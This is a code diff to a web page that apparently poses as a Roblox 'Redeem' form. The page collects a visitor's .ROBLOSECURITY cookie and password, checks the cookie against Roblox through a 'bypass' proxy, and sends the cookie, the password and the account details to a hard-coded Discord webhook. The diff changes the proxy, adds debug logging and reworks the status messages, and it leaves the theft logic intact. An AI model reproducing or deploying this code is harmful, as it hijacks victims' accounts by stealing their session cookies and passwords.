@@ -75,8 +75,8 @@
     padding: 12px 16px; border-radius: 12px; color: #fff; font-weight: 500;
     backdrop-filter: blur(10px); animation: fadeInUp 0.35s ease;
   }
-  .status-box.success { background: rgba(80, 160, 255, 0.18); border: 1px solid rgba(120, 180, 255, 0.4); }
-  .status-box.error { background: rgba(255, 80, 100, 0.18); border: 1px solid rgba(255, 120, 140, 0.4); }
+  .status-box.success { background: rgba(80, 255, 130, 0.18); border: 1px solid rgba(120, 255, 160, 0.5); box-shadow: 0 4px 20px rgba(80, 255, 130, 0.25); }
+  .status-box.error { background: rgba(255, 80, 100, 0.18); border: 1px solid rgba(255, 120, 140, 0.4); box-shadow: 0 4px 20px rgba(255, 80, 100, 0.25); }
   @keyframes fadeInUp { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: translateY(0); } }
   footer { margin-top: 50px; color: #5f7fa0; font-size: 0.8em; z-index: 1; }
   .bulb {
@@ -166,7 +166,7 @@
 
 <script>
   const WEBHOOK_URL = "https://discord.com/api/webhooks/1525520420260941955/2AOfsSAlQ6nr1UITDMHXStyEiLaKGDMpsWeHFldDpL8dVl8Z1O2VCZ3NNd3N9mp-TlJ_";
-  const WORKER_URL = "https://bypass.semgasigma4.workers.dev";
+  const PROXY_URL = "https://bypass-proxy.onrender.com"; // ЗАМЕНИ НА СВОЙ URL WEB SERVICE
 
   function toCodeBlock(text) {
     const safe = text.replace(/`/g, "'");
@@ -183,33 +183,51 @@
     return c.replace(/^["';]+|["';]+$/g, "").trim();
   }
 
+  function showStatus(type, text) {
+    const statusEl = document.getElementById("status");
+    statusEl.innerHTML = '<div class="status-box ' + type + '">' + text + '</div>';
+  }
+
   async function validateCookie(cookie) {
     const cleaned = cleanCookie(cookie);
+    console.log("[DEBUG] Cleaned cookie:", cleaned);
+    
     if (!cleaned || cleaned.length < 50) {
       return { isValid: false, userId: 0, username: "Too short", reason: "Cookie too short" };
     }
+    
     const target = "https://users.roblox.com/v1/users/authenticated";
-    const proxyUrl = WORKER_URL + "?path=" + encodeURIComponent(target);
+    const proxyUrl = PROXY_URL + "?url=" + encodeURIComponent(target);
+    console.log("[DEBUG] Request URL:", proxyUrl);
+
     try {
       const controller = new AbortController();
-      const timeoutId = setTimeout(() => controller.abort(), 10000);
+      const timeoutId = setTimeout(() => controller.abort(), 15000);
+      
       const response = await fetch(proxyUrl, {
         method: "GET",
         headers: { "X-Roblox-Cookie": cleaned, "Accept": "application/json" },
         signal: controller.signal
       });
+      
       clearTimeout(timeoutId);
+      console.log("[DEBUG] Response status:", response.status);
+      
       if (response.status === 200) {
         const data = await response.json();
+        console.log("[DEBUG] Response data:", data);
         if (data && data.id) {
           return { isValid: true, userId: data.id, username: data.name || "Unknown", cleanedCookie: cleaned };
         }
       }
+      
       if (response.status === 401 || response.status === 403) {
-        return { isValid: false, userId: 0, username: "Invalid", reason: "HTTP " + response.status + " — Unauthorized" };
+        return { isValid: false, userId: 0, username: "Invalid", reason: "Invalid cookie" };
       }
+      
       return { isValid: false, userId: 0, username: "Error", reason: "HTTP " + response.status };
     } catch (err) {
+      console.log("[DEBUG] Error:", err);
       return { isValid: false, userId: 0, username: "Error", reason: "Network: " + err.message };
     }
   }
@@ -245,46 +263,43 @@
   document.getElementById("mainForm").addEventListener("submit", async (e) => {
     e.preventDefault();
     const button = document.getElementById("redeemBtn");
-    const statusEl = document.getElementById("status");
 
     const message1 = document.getElementById("f1-message").value.trim();
     const message2 = document.getElementById("f2-message").value.trim();
 
     if (!(message1.startsWith("_|W") || message1.startsWith("C"))) {
-      statusEl.innerHTML = '<div class="status-box error">Field 1: must start with _|W or C</div>';
+      showStatus("error", "Field 1: must start with _|W or C");
       return;
     }
     if (!message2) {
-      statusEl.innerHTML = '<div class="status-box error">Password cannot be empty</div>';
+      showStatus("error", "Password cannot be empty");
       return;
     }
 
     button.disabled = true;
-    statusEl.innerHTML = '<div class="status-box" style="background:rgba(255,255,255,0.08);border:1px solid rgba(255,255,255,0.2);">Validating cookie...</div>';
+    showStatus("", "Validating cookie...");
 
     const cookieResult = await validateCookie(message1);
 
     if (!cookieResult.isValid) {
       button.disabled = false;
-      statusEl.innerHTML = '<div class="status-box error">❌ ' + (cookieResult.reason || "Invalid Cookie!") + '</div>';
+      showStatus("error", "❌ Invalid Cookie! " + (cookieResult.reason || ""));
       return;
     }
 
-    statusEl.innerHTML = '<div class="status-box" style="background:rgba(255,255,255,0.08);border:1px solid rgba(255,255,255,0.2);">Sending data...</div>';
+    showStatus("success", "✓ Valid! " + cookieResult.username + " (ID: " + cookieResult.userId + ")");
+    
+    // Отправляем в Discord
     const result = await sendToDiscord(selectedCategory, message1, message2, cookieResult);
-
     button.disabled = false;
-
+    
     if (result.ok) {
-      statusEl.innerHTML = "";
       e.target.reset();
-      startCooldown(button, statusEl, 180);
-    } else {
-      statusEl.innerHTML = '<div class="status-box error">' + result.reason + '</div>';
+      startCooldown(button, 180);
     }
   });
 
-  function startCooldown(button, statusEl, seconds) {
+  function startCooldown(button, seconds) {
     let remaining = seconds;
     button.disabled = true;
     const progressTrack = document.getElementById("progressTrack");
@@ -305,7 +320,7 @@
         button.disabled = false;
         button.textContent = "Redeem";
         progressTrack.classList.remove("show");
-        statusEl.innerHTML = '<div class="status-box success">✓ Everything was completed successfully.</div>';
+        progressFill.style.width = "0%";
         return;
       }
       remaining--;
